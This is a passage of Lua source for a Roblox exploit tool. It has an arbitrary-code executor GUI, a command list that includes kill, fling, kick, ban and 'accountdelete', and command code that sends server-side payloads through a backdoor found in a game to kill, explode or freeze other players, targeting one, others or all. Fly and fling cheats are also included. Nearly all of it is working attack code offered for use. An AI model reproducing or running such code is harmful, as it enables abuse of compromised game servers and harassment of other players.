box["execute button"].TextYAlignment = Enum.TextYAlignment.Center

box["execute button text padding"] = Instance.new("UIPadding")
box["execute button text padding"].PaddingLeft = UDim.new(0, 0)
box["execute button text padding"].Parent = box["execute button"]

box["execute button"].Parent = box["main frame 1"]
box["execute button"].ZIndex = 19
box["execute button"].Visible = false

box["execute from client button"].Size = UDim2.new(0, 158, 0, 45)
box["execute from client button"].Position = UDim2.new(0, 167, 0, 201)

box["execute from client button"].BackgroundColor3 = box["default background color"]

box["execute from client button"].BorderColor3 = box["default border color"]
box["execute from client button"].BorderSizePixel = 1

box["execute from client button"].TextColor3 = box["default border color"]
box["execute from client button"].Font = Enum.Font.RobotoMono
box["execute from client button"].TextSize = 15
box["execute from client button"].TextScaled = false
box["execute from client button"].Text = "execute from client"
box["execute from client button"].TextXAlignment = Enum.TextXAlignment.Center
box["execute from client button"].TextYAlignment = Enum.TextYAlignment.Center

box["execute from client button text padding"] = Instance.new("UIPadding")
box["execute from client button text padding"].PaddingLeft = UDim.new(0, 0)
box["execute from client button text padding"].Parent = box["execute button"]

box["execute from client button"].Parent = box["main frame 1"]
box["execute from client button"].ZIndex = 19
box["execute from client button"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["clear button"].Size = UDim2.new(0, 67, 0, 45)
box["clear button"].Position = UDim2.new(0, 330, 0, 201)

box["clear button"].BackgroundColor3 = box["default background color"]

box["clear button"].BorderColor3 = box["default border color"]
box["clear button"].BorderSizePixel = 1

box["clear button"].TextColor3 = box["default border color"]
box["clear button"].Font = Enum.Font.RobotoMono
box["clear button"].TextSize = 15
box["clear button"].TextScaled = false
box["clear button"].Text = "clear"
box["clear button"].TextXAlignment = Enum.TextXAlignment.Center
box["clear button"].TextYAlignment = Enum.TextYAlignment.Center

box["clear button text padding"] = Instance.new("UIPadding")
box["clear button text padding"].PaddingLeft = UDim.new(0, 0)
box["clear button text padding"].Parent = box["clear button"]

box["clear button"].Parent = box["main frame 1"]
box["clear button"].ZIndex = 19
box["clear button"].Visible = false

box["execute button"].MouseButton1Click:Connect(function()
	if backdoor ~= nil then unablenotify("you cannot execute server code without a backdoor.") return end
	if hasscanned == true then return end
	local code = box["executor textbox"].Text
	spawn(function() playclicksound() end)
	if code and code ~= "" then
		assert(loadstring(code))()
	end
end)

box["execute from client button"].MouseButton1Click:Connect(function()
	local code = box["executor textbox"].Text
	spawn(function() playclicksound() end)
	if code and code ~= "" then
		assert(loadstring(code))()
	end
end)

box["clear button"].MouseButton1Click:Connect(function()
	box["executor textbox"].Text = ""
	updateCanvas()
	playclicksound()
end)

-------------------------------------------------------------------------------------------------------------------------------

local commandList = {
	"kill [target]",
	"health [target] [number]",
	"bodyfling, bfling [target]",
	"walkfling, wfling",
	"unwalkfling, unwfling",
	"fly [speed]",
	"unfly",
	"notify, n [text]",
	"freeze, ice [target]",
	"unfreeze, thaw [target]",
	"kick [target] [text]",
	"ban [target]",
	"accountdelete, terminate [target]",
	"kazotskykick, kk [target]",
	"explode [target]",
	-- "bang [target] [speed]",
	-- "unbang",
	-- "carpet [target]",
	-- "uncarpet",
	"spectate, view [target]",
	"unspectate, unview",
	-- "facebang [target]",
	-- "unfacebang",
	"jumpscare, js [target] [image id] [sound id]",
	-- "popup [target] [image id]",
	-- "unpopup [target]",
	-- "playaudio [target] [sound id]",
	"headbillboard, headbb [target] [image id]",
	"unheadbillboard, unheadbb [target]",
	-- "torsobillboard [target] [image id]",
	-- "untorsobillboard [target]",
	-- "punish [target]",
	-- "unpunish [target]",
	"spin [target] [speed]",
	"unspin [target]",
	"partring, pring [radius]",
	"unpring",
	-- "orbit [target] [speed] [offset]",
	-- "unorbit",
	-- "follow [target]",
	-- "unfollow",
	-- "creeper [target]",
	-- "uncreeper [target]",
	-- "headless [target]",
	-- "unheadless [target]",
	-- "hairless [target]",
	-- "unhairless [target]",
	"accessoryless, aless [target]",
	"unaccessoryless, unaless [target]",
	-- "forceplace [target] [game id]",
	"chickenarms, carms [target]",
	"discoavatar, davi [target]",
	"headslide, hslide [target]",
	"meshdisco, mdisco [target]",
	"fire [target]",
	"chat, talk [target] [text]",
	"particle [target] [image id]",
	"unparticle [target]",
	"screenimage, simage [target] [image id]",
	"unscreenimage, unsimage [target]",
	"r6 [target]",
	"r15 [target]",
	"respawn, re [target]",
	"eggdog [target]",
	"decalspam, dspam [image id]",
	"billboardspam, bbspam [image id]",
	"replaceskybox, sky [image id]",
	-- "billboardspray [image id]",
	-- "unbillboardspray",
	"disco",
	"undisco",
	"fullbright, fb",
	"unfullbright, unfb",
	"music [sound id]",
	"unmusic",
	"volume [number]",
	"pitch [number]",
	"console",
	"esp",
	"unesp",
	"dynamic9007, dyn9007",
	"antifling, afling",
	"unantifling, uafling",
	"walkonwalls, wallwalk",
	-- "restoremap",
	"hint [text]",
	"closehints, nohints",
	"closeunlabeledhints, noulhints",
	"closelabeledhints, nolhints",
	"message [text]",
	"closemessages, nomsgs",
	"closeunlabeledmessages, noulmsgs",
	"closelabeledmessages, nolmsgs",
	"guns [target]",
	"btools, f3x [target]",
	"tools [target]",
	"airstriketools, ast [target]",
	-- "",
	-- "dance1 [target]",
	-- "undance1 [target]",
	-- "dance2 [target]",
	-- "undance2 [target]",
	-- "dance3 [target]",
	-- "undance3 [target]",
	-- "wave [target]",
	-- "cheer [target]",
	-- "laugh [target]",
	-- "customdance [target]",
	-- "playanim [target] [animation id]",
	-- "spasm [target]",
	-- "unspasm [target]",
	-- "tpose [target]",
	-- "untpose [target]",
	-- "stopanim [target]",
	-- "reanim [target]",
	-- "headthrow [target]",
	"opendonuttab, donut",
	"openbinarytab, binary",
	"openheadcanongeneratortab, hcgen",
	"opengaydartab, gaydar",
	"openvideotab, video",
	"openmessagereversertab, msgreverser",
	"opennoxsecencoderanddecodertab, noxsec",
}

populateList(box["list of commands"], commandList)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spectate", "view", function(target)
	execcmd("unview")
	local players = box["players"]
	local localPlayer = players.LocalPlayer
	local camera = workspace.CurrentCamera

	local function getTargetPlayer(target)
		if target == "me" then
			return localPlayer
		elseif target == "random" then
			local allPlayers = players:GetPlayers()
			if #allPlayers > 0 then
				return allPlayers[math.random(1, #allPlayers)]
			end
		elseif target == "others" then
			return nil
		elseif target == "all" then
			return nil
		else
			for _, player in ipairs(players:GetPlayers()) do
				if player.Name:lower():find(target:lower(), 1, true) then
					return player
				end
			end
		end
		return nil
	end

	local targetPlayer = getTargetPlayer(target)

	if not targetPlayer or targetPlayer == localPlayer then
		return
	end

	local targetCharacter = targetPlayer.Character
	if targetCharacter and targetCharacter:FindFirstChild("Head") then
		camera.CameraSubject = targetCharacter.Head
	end
end)

addcommand("unspectate", "unview", function()
	workspace.CurrentCamera:remove()
	task.wait(.1)
	repeat task.wait() until box["local player"].Character ~= nil
	workspace.CurrentCamera.CameraSubject = box["local player"].Character:FindFirstChildWhichIsA('Humanoid')
	workspace.CurrentCamera.CameraType = "Custom"
	box["local player"].CameraMinZoomDistance = 0.5
	box["local player"].CameraMaxZoomDistance = 400
	box["local player"].CameraMode = "Classic"
	box["local player"].Character.Head.Anchored = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("notify", "n", function(...)
	text = table.concat({...}, " ")
	unablenotify(text)
end)

-------------------------------------------------------------------------------------------------------------------------------

FLYING = false
QEfly = true
iyflyspeed = 1
vehicleflyspeed = 1

function sFLY(vfly)
	repeat wait() until box["players"].LocalPlayer and box["players"].LocalPlayer.Character and getRoot(box["players"].LocalPlayer.Character) and box["players"].LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	repeat wait() until box["players"].LocalPlayer:GetMouse()
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

	local T = getRoot(box["players"].LocalPlayer.Character)
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro')
		local BV = Instance.new('BodyVelocity')
		BG.P = 9e4
		BG.Parent = T
		BV.Parent = T
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		task.spawn(function()
			repeat wait()
				if not vfly and box["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					box["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:Destroy()
			BV:Destroy()
			if box["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				box["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	flyKeyDown = box["players"].LocalPlayer:GetMouse().KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 's' then
			CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 'a' then
			CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 'd' then 
			CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
		elseif QEfly and KEY:lower() == 'e' then
			CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
		elseif QEfly and KEY:lower() == 'q' then
			CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
	end)
	flyKeyUp = box["players"].LocalPlayer:GetMouse().KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
	if box["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		box["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end
	pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
end

local velocityHandlerName = "uwuvh"
local gyroHandlerName = "uwugh"
local mfly1
local mfly2

local unmobilefly = function(speaker)
	pcall(function()
		FLYING = false
		local root = getRoot(speaker.Character)
		root:FindFirstChild(velocityHandlerName):Destroy()
		root:FindFirstChild(gyroHandlerName):Destroy()
		speaker.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
		mfly1:Disconnect()
		mfly2:Disconnect()
	end)
end

local mobilefly = function(speaker, vfly)
	unmobilefly(speaker)
	FLYING = true

	local root = getRoot(speaker.Character)
	local camera = workspace.CurrentCamera
	local v3none = Vector3.new()
	local v3zero = Vector3.new(0, 0, 0)
	local v3inf = Vector3.new(9e9, 9e9, 9e9)

	local controlModule = require(speaker.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
	local bv = Instance.new("BodyVelocity")
	bv.Name = velocityHandlerName
	bv.Parent = root
	bv.MaxForce = v3zero
	bv.Velocity = v3zero

	local bg = Instance.new("BodyGyro")
	bg.Name = gyroHandlerName
	bg.Parent = root
	bg.MaxTorque = v3inf
	bg.P = 1000
	bg.D = 50

	mfly1 = speaker.CharacterAdded:Connect(function()
		local bv = Instance.new("BodyVelocity")
		bv.Name = velocityHandlerName
		bv.Parent = root
		bv.MaxForce = v3zero
		bv.Velocity = v3zero

		local bg = Instance.new("BodyGyro")
		bg.Name = gyroHandlerName
		bg.Parent = root
		bg.MaxTorque = v3inf
		bg.P = 1000
		bg.D = 50
	end)

	mfly2 = box["run service"].RenderStepped:Connect(function()
		root = getRoot(speaker.Character)
		camera = workspace.CurrentCamera
		if speaker.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			local VelocityHandler = root:FindFirstChild(velocityHandlerName)
			local GyroHandler = root:FindFirstChild(gyroHandlerName)

			VelocityHandler.MaxForce = v3inf
			GyroHandler.MaxTorque = v3inf
			if not vfly then humanoid.PlatformStand = true end
			GyroHandler.CFrame = camera.CoordinateFrame
			VelocityHandler.Velocity = v3none

			local direction = controlModule:GetMoveVector()
			if direction.X > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
			if direction.X < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
			if direction.Z > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
			if direction.Z < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
		end
	end)
end

function isNumber(str)
	if tonumber(str) ~= nil or str == 'inf' then
		return true
	end
end

addcommand("fly", "fly", function(args)
	if not box["is mobile?"] then
		NOFLY()
		wait()
		sFLY()
	else
		mobilefly(box["local player"])
	end
	if args and isNumber(args) then
		iyflyspeed = args
	end
end)

addcommand("unfly", "unfly", function(args)
	if not box["is mobile?"] then NOFLY() else unmobilefly(box["local player"]) end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kill", "kill", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function brkjoints(player)
		if player and player.Character then
			player.Character:BreakJoints()
		end
	end

	local function keel(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game:GetService("Players").LocalPlayer
				if localPlayer then
					brkjoints(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					brkjoints(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game:GetService("Players").LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						brkjoints(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					brkjoints(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						brkjoints(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v.Character:BreakJoints()
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v.Character:BreakJoints()
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v.Character:BreakJoints()
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v.Character:BreakJoints()
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v.Character:BreakJoints()
						end
					end
				]], player.Name)
				break
			end
		end
	end

	keel(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("explode", "explode", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function kaboom(player)
		if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local character = player.Character
			local explosion = Instance.new("Explosion")
			explosion.Position = character.HumanoidRootPart.Position
			explosion.BlastPressure = 0
			explosion.BlastRadius = 10
			explosion.Parent = workspace

			if character:FindFirstChild("Humanoid") then
				character.Humanoid.Health = 0
			end

			for _, part in pairs(character:GetChildren()) do
				if part:IsA("Motor6D") then
					part:Destroy()
				end
			end
		end
	end

	local function explod(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game:GetService("Players").LocalPlayer
				if localPlayer then
					kaboom(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					kaboom(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game:GetService("Players").LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						kaboom(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					kaboom(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						kaboom(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local explosion = Instance.new("Explosion")
						explosion.Position = v.Character.HumanoidRootPart.Position
						explosion.BlastPressure = 0
						explosion.BlastRadius = 10
						explosion.Parent = workspace
						for _, part in pairs(v.Character:GetChildren()) do
							if part:IsA("Motor6D") then
								part:Destroy()
							end
						end
						v.Character.Humanoid.Health = 0
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local explosion = Instance.new("Explosion")
							explosion.Position = v.Character.HumanoidRootPart.Position
							explosion.BlastPressure = 0
							explosion.BlastRadius = 10
							explosion.Parent = workspace
							for _, part in pairs(v.Character:GetChildren()) do
								if part:IsA("Motor6D") then
									part:Destroy()
								end
							end
							v.Character.Humanoid.Health = 0
						end
					end
				]], player.Name)
				break
			end
		end
	end

	explod(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("health", "health", function(target, number)
	local players = game:GetService("Players"):GetPlayers()
	local amt = tonumber(number)

	if not amt then
		return
	end

	local function health(player)
		local character = player.Character
		if character then
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Health = amt
			end
		end
	end

	local function sethealth(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					health(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					health(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						health(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					health(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						health(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. amt .. [[
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoid = character:FindFirstChildOfClass("Humanoid")
							if humanoid then
								humanoid.Health = ]] .. amt .. [[
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. amt .. [[
						end
					end
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. amt .. [[
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoid = character:FindFirstChildOfClass("Humanoid")
								if humanoid then
									humanoid.Health = ]] .. amt .. [[
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	sethealth(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

local walkflinging = false

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function disablewalkfling()
	walkflinging = false
end

function enablewalkfling()
	local humanoid = box["local player"].Character:FindFirstChildWhichIsA("Humanoid")
	if humanoid then
		humanoid.Died:Connect(function()
			disablewalkfling()
		end)
	end

	local walkflinging = true
	repeat box["run service"].RenderStepped:Wait()
		local character = box["local player"].Character
		local root = getRoot(character)
		local vel, movel = nil, 0.1

		while not (character and character.Parent and root and root.Parent) do
			box["run service"].Heartbeat:Wait()
			character = box["local player"].Character
			root = getRoot(character)
		end

		vel = root.Velocity
		root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)

		box["run service"].Stepped:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel
		end

		box["run service"].Heartbeat:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel + Vector3.new(0, movel, 0)
			movel = movel * -1
		end
	until walkflinging == false
end

addcommand("walkfling", "wfling", function()
	enablewalkfling()
end)

addcommand("unwalkfling", "unwfling", function()
	disablewalkfling()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("freeze", "ice", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function iceicebaby(player)
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPart.Anchored = true
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid.PlatformStand = true
				end
			end
		end
	end

	local function colddddd(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					iceicebaby(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					iceicebaby(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						iceicebaby(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					iceicebaby(player)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						iceicebaby(player)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								humanoidRootPart.Anchored = true
								local humanoid = character:FindFirstChild("Humanoid")
								if humanoid then
									humanoid.PlatformStand = true
								end
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
								if humanoidRootPart then
									humanoidRootPart.Anchored = true
									local humanoid = character:FindFirstChild("Humanoid")
									if humanoid then
										humanoid.PlatformStand = true
									end
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	colddddd(bckd)
end)

addcommand("unfreeze", "thaw", function(target)
